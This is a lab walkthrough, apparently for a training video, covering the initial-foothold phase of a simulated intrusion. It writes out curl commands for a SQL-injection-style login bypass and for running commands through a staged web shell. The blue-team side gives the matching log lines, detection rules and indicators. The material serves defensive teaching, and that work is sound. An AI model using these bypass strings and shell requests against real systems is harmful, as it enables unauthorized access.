# Phase 2 — Initial foothold (simulated auth bypass → web shell)

> Reference scenario — authorized lab use only. Requires `WEAK_AUTH=1`
> (phase 0). See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Initial access (kill chain step 2) via a web authentication bypass, and the
difference between an exploit *attempt* and an exploit *success* in the logs.

## Objective

Turn the public login page into an authenticated admin session using the
staged bypass string, then reach the developer console (`/console`) — the
simulated web shell that the rest of the scenario drives.

## Attacker steps

```bash
# Still in the attacker container (phase 1):
docker exec -it attacker bash

# 1) The bypass: the portal accepts this password string as an admin login
#    when WEAK_AUTH=1 (a visual stand-in for SQL injection - no DB harmed).
curl -s -c /tmp/ck.txt -X POST \
     --data-urlencode "username=admin" \
     --data-urlencode "password=admin' OR 1=1--" \
     http://172.31.100.1/login -o /dev/null -w '%{http_code}\n'
#   expected: 302 (redirect to /dashboard = authenticated)

# 2) Confirm the session and the admin panel:
curl -s -b /tmp/ck.txt http://172.31.100.1/dashboard | grep Signed
curl -s -b /tmp/ck.txt http://172.31.100.1/admin | grep SIMULATED

# 3) Open the developer console (the simulated web shell):
curl -s -b /tmp/ck.txt "http://172.31.100.1/console?token=DEV-2026" | grep -o 'SIMULATED VULNERABILITY[^<]*'

# 4) First command through the shell - who and where are we?
curl -s -b /tmp/ck.txt -X POST \
     --data-urlencode "cmd=id; hostname; ip -brief addr show eth0" \
     "http://172.31.100.1/console?token=DEV-2026"
#   expected: uid=0(root) ... hostname web01 ... 10.10.10.5 (the DMZ address)
```

With `WEAK_AUTH=0` the bypass is rejected (401) and the console returns 404 —
run it both ways once to see the difference in phase 3's logs.

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| Bypass accepted | web01 app log | `2026-01-15 03:02:41,118 INFO AUTH-BYPASS ip=172.31.100.3 user=admin (password matched simulated SQLi string)` | SIEM rule 100910 |
| Console opened + commands | web01 app log | `2026-01-15 03:03:02,540 INFO CONSOLE-EXEC ip=172.31.100.3 user=admin cmd=id; hostname; ip -brief addr show eth0` | SIEM rule 100911 |
| The raw requests | web01 nginx | `172.31.100.3 - - [15/Jan/2026:03:02:41 +0000] "POST /login HTTP/1.1" 302 0 ... "curl/8.5.0"` | nginx access log |

```bash
# Blue-team commands:
docker exec web01 grep 'AUTH-BYPASS' /var/log/app/access.log
docker exec web01 grep 'CONSOLE-EXEC' /var/log/app/access.log
docker logs web01 2>&1 | grep -E 'AUTH-BYPASS|CONSOLE-EXEC' | tail   # stdout copy
```

Note that the exact commands the attacker ran are visible in the app log —
the shell is loud by design, so the blue team can replay the intrusion.

## IOC vs IoA box

- **IOC (artifact):** the literal strings `admin' OR 1=1--` (in the request)
  and `token=DEV-2026` (in the URL) — concrete, blockable indicators.
- **IoA (behavior):** a failed-or-single login followed within seconds by
  authenticated `/console` POSTs — the *sequence* is the attack, either part
  alone is just a request.

## Kill chain position

Step 2 — initial access (the bypass), with step 3 execution beginning as soon
as the first command runs in `/console`.
